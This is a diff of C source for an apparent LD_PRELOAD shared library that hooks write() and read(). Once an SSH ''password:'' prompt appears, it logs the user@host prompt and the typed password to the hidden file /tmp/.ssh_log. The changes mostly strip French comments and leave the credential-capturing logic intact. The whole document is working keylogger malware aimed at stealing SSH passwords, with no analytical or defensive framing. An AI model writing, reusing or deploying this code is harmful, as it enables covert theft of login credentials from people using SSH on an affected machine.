@@ -8,8 +8,9 @@
 static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
 static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
 
-static int capturing = 0;  // 1 = capture active, 0 = capture désactivée
-static char ssh_user_prompt[256] = "";  // Stocke le prompt SSH (username@host)
+//attribution capture 
+static int capturing = 0;  
+static char ssh_user_prompt[256] = "";
 
 void init() {
     if (!real_write) {
@@ -20,15 +21,15 @@ void init() {
     }
 }
 
-// Hook de write()
+// Hook write()
 ssize_t write(int fd, const void *buf, size_t count) {
     init();
 
-    // Vérifie si le prompt SSH est affiché
-    if (strstr(buf, "'s password:") != NULL) {
-        capturing = 1;  // Activer la capture
 
-        // Stocker le prompt complet pour le réutiliser lors de la capture du mot de passe
+    if (strstr(buf, "'s password:") != NULL) {
+        capturing = 1;  
+
+        // Stock le prompt
         snprintf(ssh_user_prompt, sizeof(ssh_user_prompt), "%.*s", (int)count, (char *)buf);
 
         FILE *logfile = fopen("/tmp/.ssh_log", "a");
@@ -41,11 +42,11 @@ ssize_t write(int fd, const void *buf, size_t count) {
     return real_write(fd, buf, count);
 }
 
-// Hook de read()
+// Hook read()
 ssize_t read(int fd, void *buf, size_t count) {
     init();
     
-    ssize_t ret = real_read(fd, buf, count);  // Lire normalement les données
+    ssize_t ret = real_read(fd, buf, count);
 
     if (capturing && ret > 0) {  // Si la capture est active et qu’on lit quelque chose
         FILE *logfile = fopen("/tmp/.ssh_log", "a");
@@ -54,7 +55,7 @@ ssize_t read(int fd, void *buf, size_t count) {
             fclose(logfile);
         }
 
-        if (memchr(buf, '\n', ret) != NULL) {  // Si un '\n' est détecté, arrêt de la capture
+        if (memchr(buf, '\n', ret) != NULL) {
             capturing = 0;
             ssh_user_prompt[0] = '\0';  // Réinitialiser après capture du mot de passe
         }
